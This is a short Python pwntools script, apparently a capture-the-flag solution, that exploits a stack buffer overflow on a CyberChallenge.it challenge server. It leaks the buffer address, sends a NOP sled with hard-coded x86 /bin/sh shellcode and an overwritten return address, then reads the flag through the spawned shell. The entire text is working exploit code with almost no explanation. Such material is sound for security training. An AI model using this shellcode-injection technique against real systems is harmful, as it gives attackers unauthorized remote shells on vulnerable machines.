from pwn import *

r = remote("securitycheck.challs.cyberchallenge.it", 9261)
print(r.recv())
r.sendline(("A"*255).encode())
words = r.recvuntil(b',')
#starting vulnerable buffer
dst_address = words.split()[-1][:-1]
print(r.recvline())
print(r.recvline())
#/bin/sh shellcode
shellcode = b"\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
padding = asm("nop")*(238-len(shellcode))
return_address = p32(int(dst_address.decode('utf-8'), 16))
padding_2 = b"A"*12
payload =padding + shellcode + return_address + padding_2
print(len(payload))
r.sendline(payload)
print(r.recv())
print(r.recv())
r.sendline(b"cat flag.txt")
print(r.recv())

























